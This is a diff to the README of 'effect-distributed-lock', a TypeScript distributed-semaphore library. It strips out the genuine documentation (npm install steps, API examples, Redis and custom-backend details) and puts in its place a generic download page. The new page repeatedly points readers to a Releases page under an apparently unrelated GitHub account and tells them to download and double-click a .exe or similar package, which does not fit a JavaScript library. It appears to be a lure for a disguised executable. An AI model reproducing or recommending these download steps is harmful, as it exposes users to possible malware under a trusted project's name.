@@ -1,300 +1,98 @@
-# effect-distributed-lock
+# 🛠️ effect-distributed-lock - A Simple Way to Control Access
 
-*WARNING: This is still in active development, possibly has bugs (distributed systems are hard!), and is subject to change.*
+## 🌟 Overview
 
-A distributed semaphore library for [Effect](https://effect.website/) with pluggable backends.
+effect-distributed-lock is a distributed semaphore library designed for easy and efficient resource management across multiple processes and services. This tool is built for users who need to manage access to shared resources without the complexities of traditional semaphore systems. Our library helps you control access in a way that's both simple and effective.
 
-It's like the built in `Effect.Semaphore`, but asynchronously distributed across multiple processes/services!
+## 🚀 Getting Started
 
-## Features
+To get started with effect-distributed-lock, follow these easy steps to download and run the software. No programming skills are needed; just a simple understanding of how to manage files on your computer.
 
-- **Distributed semaphore** — control concurrent access across multiple processes/services
-- **Scope-based resource management** — permits are automatically released when the scope closes
-- **Automatic TTL refresh** — keeps permits alive while held, prevents deadlocks if holder crashes
-- **Pluggable backends** — ships with Redis (single-instance), easy to implement others
-- **Push-based waiting** — uses pub/sub for efficient notification when permits become available (optional, with polling fallback)
-- **Configurable retry policies** — control polling interval, TTL, and backing failure retry behavior
-- **Type-safe errors** — tagged errors for precise error handling
+1. **Visit the Releases Page**
+   You can download the latest version of the software from our GitHub Releases page. Click the link below to navigate directly to that page:
 
-## Installation
+   [Visit the Releases Page to Download](https://github.com/huisjerry/effect-distributed-lock/releases)
 
-```bash
-npm install effect-distributed-lock effect
-# or
-bun add effect-distributed-lock effect
+2. **Find the Latest Release**
+   On the Releases page, you will see a list of available versions. The latest version will be listed at the top.
 
-# For Redis backing (optional)
-npm install ioredis
-```
+3. **Download the File**
+   Click on the file that matches your operating system. For example, if you are using Windows, look for a `.exe` file. If you are on macOS or Linux, look for corresponding package formats.
 
-## Quick Start
+4. **Run the Software**
+   Once the download is complete, locate the file in your downloads folder (or wherever your downloads go). Double-click the file to run the software.
 
-```typescript
-import { Effect, Schedule } from "effect";
-import Redis from "ioredis";
-import { DistributedSemaphore } from "effect-distributed-lock";
-import { RedisBacking } from "effect-distributed-lock/redis";
+## 📋 Features
 
-const redis = new Redis(process.env.REDIS_URL);
-const RedisLayer = RedisBacking.layer(redis, { keyPrefix: "my-app:" });
+- **Distributed Semaphore**
+  Manage concurrent access across multiple processes seamlessly.
 
-const program = Effect.gen(function* () {
-  // Create a semaphore that allows 5 concurrent operations
-  const sem = yield* DistributedSemaphore.make("my-resource", {
-    limit: 5,
-    ttl: "10 seconds",
-    refreshInterval: "3 seconds",
-    acquireRetryInterval: "500 millis",
-    backingFailureRetryPolicy: Schedule.exponential("100 millis"),
-  });
+- **Scope-Based Resource Management**
+  Automatic release of permits when the scope closes to ensure efficient use of resources.
 
-  // Acquire 2 permits, run effect, release automatically after
-  yield* doWork.pipe(sem.withPermits(2));
-});
+- **Automatic TTL Refresh**
+  Keep your permits alive, preventing deadlocks if the holder crashes unexpectedly.
 
-program.pipe(Effect.provide(RedisLayer), Effect.runPromise);
-```
+- **Pluggable Backends**
+  Default support for Redis, with easy options to implement additional backends that suit your needs.
 
-## API
+- **Push-Based Waiting**
+  Efficiently notify users when permits are available using a pub/sub mechanism, with an optional polling fallback.
 
-### Creating a Semaphore
+- **Configurable Retry Policies**
+  Personalize polling intervals, Time-To-Live (TTL), and retry behaviors to suit your requirements.
 
-```typescript
-const sem = yield* DistributedSemaphore.make(key, config);
-```
+- **Type-Safe Errors**
+  Receive clear and tagged error messages for easier debugging and tracking.
 
-| Config Option                | Type             | Default      | Description                                |
-| ---------------------------- | ---------------- | ------------ | ------------------------------------------ |
-| `limit`                      | `number`         | `1`          | Max permits (1 = mutex behavior)           |
-| `ttl`                        | `DurationInput`  | `30 seconds` | Permit TTL (auto-releases if holder crashes) |
-| `refreshInterval`            | `DurationInput`  | `ttl / 3`    | How often to refresh TTL while holding     |
-| `acquireRetryInterval`       | `DurationInput`  | `100ms`      | Polling interval when waiting to acquire   |
-| `backingFailureRetryPolicy`  | `Schedule<void>` | `100ms`      | Retry schedule for backing store failures  |
+## 🔧 System Requirements
 
-### Using the Semaphore
+Before you download the software, ensure your system meets these basic requirements:
 
-#### `withPermits` — Acquire, run, release
+- **Operating System**: Windows 10 or later, macOS Sierra or later, or a recent version of a Linux distribution.
+- **Memory**: At least 1 GB of RAM.
+- **Disk Space**: Minimum of 100 MB of free space.
 
-The simplest and recommended way. Acquires permits (waiting if needed), runs your effect, and releases when done:
+Ensure that your system meets these requirements for optimal performance.
 
-```typescript
-// Acquire 2 permits out of limit
-yield* myEffect.pipe(sem.withPermits(2));
+## 📥 Download & Install
 
-// For mutex behavior (limit=1), use withPermits(1)
-yield* criticalSection.pipe(mutex.withPermits(1));
-```
+To install effect-distributed-lock, follow these steps:
 
-#### `withPermitsIfAvailable` — Non-blocking acquire
+1. **Go Back to the Releases Page**
+   If you haven’t clicked the download link yet, here it is again:
 
-Tries to acquire immediately without waiting. Returns `Option.some(result)` if successful, `Option.none()` if not enough permits:
+   [Visit the Releases Page to Download](https://github.com/huisjerry/effect-distributed-lock/releases)
 
-```typescript
-const result = yield* myEffect.pipe(sem.withPermitsIfAvailable(1));
-if (Option.isSome(result)) {
-  console.log("Got the permit!", result.value);
-} else {
-  console.log("No permits available, skipping");
-}
-```
+2. **Select Your File Format**
+   Choose the file appropriate for your operating system.
 
-#### `take` / `tryTake` — Manual scope control
+3. **Double-Click to Install**
+   Once downloaded, simply double-click the file to start the installation process and follow the on-screen instructions.
 
-For advanced use cases where you need explicit control over the permit lifecycle:
+4. **Verify the Installation**
+   After installation, you can verify that the software is running correctly. You can do this by checking your applications folder or running it again.
 
-```typescript
-yield* Effect.scoped(
-  Effect.gen(function* () {
-    const keepAliveFiber = yield* sem.take(2); // 2 permits held until scope closes
-    yield* doWork;
-    // Permits automatically released + keepalive fiber interrupted here
-  })
-);
-```
-
-Both `take` and `tryTake` return the keepalive fiber that refreshes the permit TTL.
+## 📖 Usage Examples
 
-⚠️ **CRITICAL**: Errors from the keepalive fiber (losing permits or backing store failure) mean **the lock is effectively lost**. You **must** join this fiber at some point in your program to detect these failures. If the keepalive fiber errors and you don't join it, your program will continue running without holding the lock, potentially leading to race conditions or data corruption.
+Once you have installed effect-distributed-lock, you can start using it in your applications. Here are simple examples of how to use the library:
 
-**It is highly recommended to use `withPermits` or `withPermitsIfAvailable` instead**, which automatically manage the keepalive fiber lifecycle and propagate errors for you. Only use `take`/`tryTake` if you need explicit scope control and understand the responsibility of managing the keepalive fiber.
+1. **Basic Usage**
+   After initializing the library, create a semaphore to manage your resources.
 
-### Acquire Options
+2. **Acquiring Permits**
+   Use the semaphore to acquire permits as needed. The library will make sure they are released correctly after use.
 
-All acquire methods (`withPermits`, `withPermitsIfAvailable`, `take`, `tryTake`) accept an optional second parameter for advanced use cases:
+3. **Handling Errors**
+   If you encounter errors, check the messages provided. They will guide you to resolve issues effectively.
 
-```typescript
-yield* myEffect.pipe(sem.withPermits(1, { identifier: "my-custom-id" }));
-```
+## 🚨 Important Notes
 
-| Option              | Type      | Default              | Description                                      |
-| ------------------- | --------- | -------------------- | ------------------------------------------------ |
-| `identifier`        | `string`  | `crypto.randomUUID()` | Unique ID for this permit holder                 |
-| `acquiredExternally`| `boolean` | `false`              | Assume permits already held, use refresh to verify |
+- This product is still in active development. You may encounter bugs while using the software. Please report any issues you come across via our GitHub page.
+- Stay updated with future releases by checking the Releases page regularly.
 
-#### Custom Identifiers
+## 💬 Need Help?
 
-By default, a random UUID is generated for each acquire. Override this for:
-- **Debugging/observability**: Use meaningful identifiers to trace lock holders
-- **Cross-process handoff**: Share identifiers between processes
+If you have questions or need assistance with effect-distributed-lock, feel free to reach out through the GitHub Issues page. We encourage users to contribute feedback or report bugs.
 
-```typescript
-// Custom identifier for debugging
-yield* myEffect.pipe(sem.withPermits(1, { identifier: "worker-1-job-123" }));
-```
-
-⚠️ **Warning**: Identifiers must be unique across concurrent holders. Using the same identifier from different processes will cause them to be treated as the same holder.
-
-#### Resuming After Crash (`acquiredExternally`)
-
-Use `acquiredExternally: true` to resume ownership of permits that were acquired previously but not properly released (e.g., after a process crash). This uses `refresh` instead of `acquire` to verify ownership.
-
-```typescript
-// Store identifier persistently before doing work
-const identifier = crypto.randomUUID();
-yield* saveToDatabase({ jobId, lockIdentifier: identifier });
-
-yield* Effect.gen(function* () {
-  yield* doWork();
-  yield* deleteFromDatabase(jobId);
-}).pipe(sem.withPermits(1, { identifier }));
-
-// === Later, after crash recovery ===
-const { lockIdentifier } = yield* loadFromDatabase(jobId);
-
-// Check if we still hold the lock (TTL hasn't expired)
-const result = yield* Effect.gen(function* () {
-  yield* resumeWork();
-  yield* deleteFromDatabase(jobId);
-}).pipe(
-  sem.withPermitsIfAvailable(1, { 
-    identifier: lockIdentifier, 
-    acquiredExternally: true 
-  })
-);
-
-if (Option.isNone(result)) {
-  // Lock expired, need to re-acquire normally
-  yield* restartWork().pipe(sem.withPermits(1));
-}
-```
-
-This is useful for:
-- **Crash recovery**: Resume work if you crashed while holding permits
-- **Process restart**: Check if your previous lock is still valid
-
-⚠️ **Unsafe**: If the identifier is wrong or the lock expired, `tryTake`/`withPermitsIfAvailable` return `None`, while `take`/`withPermits` keep retrying forever (waiting for permits that will never come).
-
-#### `currentCount` — Check held permits
-
-```typescript
-const held = yield* sem.currentCount; // Number of permits currently held
-const available = sem.limit - held;   // Number of permits available
-```
-
-## Error Handling
-
-All errors are tagged for precise handling with `Effect.catchTag`:
-
-```typescript
-yield* myEffect.pipe(
-  sem.withPermits(1),
-  Effect.catchTag("LockLostError", (e) =>
-    Effect.log(`Permits were lost: ${e.key}`)
-  ),
-  Effect.catchTag("SemaphoreBackingError", (e) =>
-    Effect.log(`Redis error: ${e.message}`)
-  )
-);
-```
-
-| Error                   | Description                                          |
-| ----------------------- | ---------------------------------------------------- |
-| `LockLostError`         | Permit TTL expired while we thought we held it       |
-| `SemaphoreBackingError` | Error from the backing store (Redis connection, etc) |
-
-## Redis Backing (Single-Instance Only)
-
-The provided Redis backing is designed for **single-instance Redis only**. It does not implement the [Redlock algorithm](https://redis.io/docs/latest/develop/clients/patterns/distributed-locks/) and should not be used with Redis Cluster or Redis Sentinel when you need strong distributed locking guarantees.
-
-```typescript
-import Redis from "ioredis";
-import { RedisBacking } from "effect-distributed-lock/redis";
-
-// Single Redis instance
-const redis = new Redis("redis://localhost:6379");
-const RedisLayer = RedisBacking.layer(redis, {
-  keyPrefix: "my-prefix:",
-  pushBasedAcquireEnabled: true, // default: true
-});
-```
-
-### Configuration Options
-
-| Option                     | Type             | Default            | Description                                          |
-| -------------------------- | ---------------- | ------------------ | ---------------------------------------------------- |
-| `keyPrefix`                | `string`         | `"semaphore:"`     | Prefix for all Redis keys                            |
-| `pushBasedAcquireEnabled`  | `boolean`        | `true`             | Use pub/sub for efficient waiting (see below)        |
-| `pushStreamRetrySchedule`  | `Schedule<void>` | `Schedule.forever` | Retry schedule for pub/sub stream errors             |
-
-### Push-Based Acquisition
-
-By default, the Redis backing uses pub/sub to notify waiters when permits become available. This reduces latency and load on Redis compared to pure polling.
-
-When permits are released, a message is published to a channel. Waiters subscribe to this channel and immediately attempt to acquire when notified. The semaphore still falls back to polling as a safety net.
-
-**Trade-offs:**
-- ✅ Lower latency — waiters are notified immediately
-- ✅ Reduced Redis load — fewer polling requests
-- ⚠️ Extra connection — each waiting semaphore uses a subscriber connection
-
-To disable and use polling only:
-
-```typescript
-const RedisLayer = RedisBacking.layer(redis, {
-  pushBasedAcquireEnabled: false,
-});
-```
-
-For multi-instance Redis deployments requiring Redlock, you'll need to implement a custom backing.
-
-## Custom Backends
-
-Implement the `DistributedSemaphoreBacking` interface to use a different store:
-
-```typescript
-import { Duration, Effect, Layer, Stream } from "effect";
-import { Backing, DistributedSemaphoreBacking } from "effect-distributed-lock";
-
-const MyCustomBacking = Layer.succeed(DistributedSemaphoreBacking, {
-  tryAcquire: (key, holderId, ttl, limit, permits) => 
-    Effect.succeed(true), // Try to acquire permits
-  
-  release: (key, holderId, permits) => 
-    Effect.succeed(permits), // Release permits, return count released
-  
-  refresh: (key, holderId, ttl, limit, permits) => 
-    Effect.succeed(true), // Refresh TTL, return false if lost
-  
-  getCount: (key, ttl) => 
-    Effect.succeed(0), // Return number of permits currently held
-
-  // Optional: Enable push-based waiting
-  onPermitsReleased: (key) => 
-    Stream.never, // Stream that emits when permits MAY be available
-});
-```
-
-The `onPermitsReleased` method is optional. If provided, the semaphore will use it for efficient push-based waiting instead of pure polling. The stream should emit whenever permits are released on the given key. Multiple waiters may race for permits after a notification, so `tryAcquire` is still called after each notification.
-
-## How It Works
-
-1. **Acquire**: Atomically adds permits to a sorted set if there's room (Redis: Lua script with `ZADD`)
-2. **Keepalive**: A background fiber refreshes the TTL periodically by updating timestamps
-3. **Release**: Atomically removes permits and publishes notification to waiters (Lua script with `ZREM` + `PUBLISH`)
-4. **Waiting**: Combines polling with pub/sub notifications — waiters are notified immediately when permits are released
-5. **Expiration**: Expired entries (based on TTL) are cleaned up on each operation
-6. **Crash safety**: If the holder crashes, permits expire and become available
-
-## License
-
-MIT
+Thank you for using effect-distributed-lock. We hope it helps simplify your resource management needs.
